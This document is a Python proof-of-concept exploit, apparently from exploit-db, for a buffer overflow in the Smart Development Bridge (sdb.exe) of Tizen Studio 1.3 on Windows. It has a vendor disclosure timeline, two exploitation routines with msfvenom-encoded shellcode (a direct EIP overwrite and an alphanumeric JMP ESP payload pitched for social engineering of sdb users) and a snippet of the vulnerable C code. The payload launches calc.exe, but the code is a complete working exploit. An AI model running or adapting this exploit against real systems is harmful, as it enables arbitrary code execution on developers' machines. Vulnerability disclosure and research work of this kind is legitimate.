# Exploit Title: Smart Development Bridge <=2.3.2 (part of Tizen Studio 1.3 Windows x86/x64) - Buffer Overflow PoC
# Date: 22.10.17
# Exploit Author: Marcin Kopec
# Vendor Homepage: https://developer.tizen.org/
# Software Link: https://developer.tizen.org/development/tizen-studio/download#
# Version: 2.3.0, 2.3.2 (some older versions are affected as well)
# Tested on: Microsoft Windows [Version 10.0.16299.19]
# 2.3.2 (sdb.exe can be extracted from Tizen Studio 1.3 for Windows x86/x64 installation package):
# e88de99ee069412b7612d85c00aa62fc  sdb.exe
# 2.3.0:
# f9fd3896195900ec604c6f182a411e18  sdb.exe
# The file can be located in "tools" subdirectory after the extraction

# This code has been created for educational purposes only, to raise awareness on software security, and it's harmless
# by intention (the PoC runs calc.exe). Please do not change the code behaviour to malicious

# Vulnerability Discovery History
# 28/Jul/16 - Tizen Project has been informed about the vulnerability (https://bugs.tizen.org/browse/TM-249)
# 28/Jul/16 - Got suggestion from CL to inform Tizen Mobile project
# 29/Jul/16 - Moved the issue to Tizen Mobile project
# - NO RESPONSE -
# 7/Sep/16 - Escalated through Samsung security contact (BZ)
# 14/Nov/16 - Got informed by BZ that HQ is dealing with the issue with no further details
# - NO RESPONSE -
# 02/Oct/17 - Tizen Mobile project has been informed about plans to release PoC on exploit-db
# - NO RESPONSE -
# 22/Oct/17 - The PoC submitted to exploit-db


import struct
import subprocess
import sys

ARGS = " launch A A A A A "


def tech_direct_exec(sdb_path):
    # msfvenom -a x86 --platform Windows -p windows/exec CMD=calc -e x86/shikata_ga_nai \
    # -b '\x00\x20\x0a\x0d\x1b\x0b\x0c' -f python
    buf = ""
    buf += "\xb8\xb6\x98\xe6\xfa\xdb\xcb\xd9\x74\x24\xf4\x5b\x31"
    buf += "\xc9\xb1\x30\x31\x43\x13\x83\xeb\xfc\x03\x43\xb9\x7a"
    buf += "\x13\x06\x2d\xf8\xdc\xf7\xad\x9d\x55\x12\x9c\x9d\x02"
    buf += "\x56\x8e\x2d\x40\x3a\x22\xc5\x04\xaf\xb1\xab\x80\xc0"
    buf += "\x72\x01\xf7\xef\x83\x3a\xcb\x6e\x07\x41\x18\x51\x36"
    buf += "\x8a\x6d\x90\x7f\xf7\x9c\xc0\x28\x73\x32\xf5\x5d\xc9"
    buf += "\x8f\x7e\x2d\xdf\x97\x63\xe5\xde\xb6\x35\x7e\xb9\x18"
    buf += "\xb7\x53\xb1\x10\xaf\xb0\xfc\xeb\x44\x02\x8a\xed\x8c"
    buf += "\x5b\x73\x41\xf1\x54\x86\x9b\x35\x52\x79\xee\x4f\xa1"
    buf += "\x04\xe9\x8b\xd8\xd2\x7c\x08\x7a\x90\x27\xf4\x7b\x75"
    buf += "\xb1\x7f\x77\x32\xb5\xd8\x9b\xc5\x1a\x53\xa7\x4e\x9d"
    buf += "\xb4\x2e\x14\xba\x10\x6b\xce\xa3\x01\xd1\xa1\xdc\x52"
    buf += "\xba\x1e\x79\x18\x56\x4a\xf0\x43\x3c\x8d\x86\xf9\x72"
    buf += "\x8d\x98\x01\x22\xe6\xa9\x8a\xad\x71\x36\x59\x8a\x8e"
    buf += "\x7c\xc0\xba\x06\xd9\x90\xff\x4a\xda\x4e\xc3\x72\x59"
    buf += "\x7b\xbb\x80\x41\x0e\xbe\xcd\xc5\xe2\xb2\x5e\xa0\x04"
    buf += "\x61\x5e\xe1\x66\xe4\xcc\x69\x69"

    stack_adj = "\x83\xEC\x7F" * 2  # SUB ESP,0x7F - stack adjustment
    sc = stack_adj + buf

    eip = "\x01\xed\x8b"  # 008BED01 - 3 byte EIP overwrite
    payload = "B" * 2000 + "\x90" * (2086 - len(sc) - 1) + "\x90" + sc + eip

    print "Trying to exploit the binary... "
    print "Payload length: " + str(len(payload))
    print sdb_path + ARGS + payload

    subprocess.Popen([sdb_path, "launch", "A", "A", "A", "A", "A", payload], stdout=subprocess.PIPE)


def tech_social_ascii(sdb_path, jmp_esp_addr):
    eip = struct.pack('<L', int(jmp_esp_addr, 0))
    # msfvenom -a x86 --platform Windows -p windows/exec CMD=calc -e x86/alpha_mixed BufferRegister=ESP -f python
    buf = ""
    buf += "\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
    buf += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
    buf += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
    buf += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
    buf += "\x6b\x4c\x4d\x38\x4e\x62\x77\x70\x63\x30\x35\x50\x71"
    buf += "\x70\x6f\x79\x79\x75\x50\x31\x69\x50\x62\x44\x6c\x4b"
    buf += "\x32\x70\x34\x70\x6e\x6b\x76\x32\x36\x6c\x6c\x4b\x63"
    buf += "\x62\x45\x44\x6e\x6b\x61\x62\x37\x58\x76\x6f\x6f\x47"
    buf += "\x70\x4a\x51\x36\x44\x71\x69\x6f\x4c\x6c\x45\x6c\x55"
    buf += "\x31\x61\x6c\x36\x62\x54\x6c\x47\x50\x39\x51\x78\x4f"
    buf += "\x74\x4d\x67\x71\x69\x57\x68\x62\x6b\x42\x36\x32\x53"
    buf += "\x67\x4c\x4b\x61\x42\x52\x30\x6c\x4b\x31\x5a\x67\x4c"
    buf += "\x4e\x6b\x32\x6c\x57\x61\x53\x48\x59\x73\x62\x68\x67"
    buf += "\x71\x48\x51\x36\x31\x6c\x4b\x31\x49\x47\x50\x35\x51"
    buf += "\x38\x53\x6e\x6b\x30\x49\x55\x48\x68\x63\x34\x7a\x31"
    buf += "\x59\x4c\x4b\x50\x34\x6c\x4b\x33\x31\x5a\x76\x70\x31"
    buf += "\x6b\x4f\x6c\x6c\x79\x51\x78\x4f\x46\x6d\x35\x51\x58"
    buf += "\x47\x50\x38\x39\x70\x70\x75\x79\x66\x64\x43\x43\x4d"
    buf += "\x4c\x38\x55\x6b\x63\x4d\x61\x34\x70\x75\x6d\x34\x72"
    buf += "\x78\x4e\x6b\x61\x48\x45\x74\x47\x71\x78\x53\x72\x46"
    buf += "\x6c\x4b\x44\x4c\x62\x6b\x4c\x4b\x51\x48\x35\x4c\x43"
    buf += "\x31\x69\x43\x6c\x4b\x67\x74\x4e\x6b\x55\x51\x6e\x30"
    buf += "\x6b\x39\x50\x44\x65\x74\x37\x54\x53\x6b\x63\x6b\x73"
    buf += "\x51\x72\x79\x71\x4a\x72\x71\x4b\x4f\x59\x70\x43\x6f"
    buf += "\x33\x6f\x32\x7a\x4e\x6b\x62\x32\x5a\x4b\x4e\x6d\x51"
    buf += "\x4d\x32\x4a\x65\x51\x6e\x6d\x6b\x35\x6e\x52\x55\x50"
    buf += "\x73\x30\x63\x30\x46\x30\x30\x68\x55\x61\x4c\x4b\x52"
    buf += "\x4f\x4f\x77\x69\x6f\x5a\x75\x4d\x6b\x6c\x30\x6f\x45"
    buf += "\x4c\x62\x53\x66\x30\x68\x79\x36\x4a\x35\x4d\x6d\x6f"
    buf += "\x6d\x6b\x4f\x39\x45\x75\x6c\x55\x56\x53\x4c\x56\x6a"
    buf += "\x6b\x30\x39\x6b\x6b\x50\x64\x35\x76\x65\x4d\x6b\x32"
    buf += "\x67\x42\x33\x62\x52\x32\x4f\x71\x7a\x45\x50\x31\x43"
    buf += "\x69\x6f\x6e\x35\x61\x73\x31\x71\x52\x4c\x73\x53\x75"
    buf += "\x50\x41\x41"

    stack_adj = "\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A"
    stack_adj += "\x2d\x66\x4f\x66\x47\x2d\x4c\x31\x4c\x36\x2d\x67\x39\x6a\x2a\x2d\x57\x57\x57\x57\x50"
    stack_adj += "\x50\x5C" + "A" * 4
    ascii_nop_sleed = "C" * 70
    payload = sdb_path + ARGS + "A" * 4086 + eip + "\x77\x21\x42\x42\x20" + ascii_nop_sleed + stack_adj + buf
    print "Now sdb.exe user could be asked to run the following code from cmd line:"
    print payload
    f = open("sdb_poc.txt", 'w')
    f.write(payload)
    f.close()
    print "The payload has been also saved to sdb_poc.txt file for your convenience"


def bonus_exercise():
    print """Can you spot the bug here?
    
int launch_app(int argc, char** argv)
{
	static const char *const SHELL_LAUNCH_CMD = "shell:/usr/bin/sdk_launch_app ";
	char full_cmd[4096];
	int i;
	
	snprintf(full_cmd, sizeof full_cmd, "%s", SHELL_LAUNCH_CMD);

	for (i=1 ; i<argc ; i++) {
		strncat(full_cmd, " ", sizeof(full_cmd)-strlen(" ")-1);
		strncat(full_cmd, argv[i], sizeof(full_cmd)-strlen(argv[i])-1);
	}
}       
"""


def usage():
    print """Smart Development Bridge <=2.3.2 (part of Tizen Studio 1.3 Windows x86/x64) - Buffer Overflow PoC
by Marcin Kopec <m a r c i n \. k o p e c @ h o t m a i l . c o m>

Demonstrated Exploitation Techniques: 
1: Direct execution, 3-byte EIP overwrite, Stack adjustment
2: Payload for social engineering attack, JMP ESP (!mona find -s "\\xff\\xe4" -cp alphanum), Alphanumeric shellcode
3: Bonus exercise - source code analysis

This code has been created for educational purposes only, to raise awareness on software security, and it's harmless 
by intention (the PoC runs calc.exe). Please do not change the code behaviour to malicious

Usage: python sdbBOpoc.py [Technique_ID] [Path_to_sdb.exe] [Address_of_JMP_ESP]
Examples: python sdbBOpoc.py 1 C:\Tizen\Tools\sdb.exe
          python sdbBOpoc.py 2 C:\Tizen\Tools\sdb.exe 0x76476557
          python sdbBOpoc.py 3"""


def main():
    if len(sys.argv) > 1:
        if int(sys.argv[1]) == 1:
            if len(sys.argv) == 3:
                tech_direct_exec(sys.argv[2])
        if int(sys.argv[1]) == 2:
            if len(sys.argv) == 4:
                tech_social_ascii(sys.argv[2], sys.argv[3])
        if int(sys.argv[1]) == 3:
            bonus_exercise()
    else:
        usage()


if __name__ == '__main__':
    main()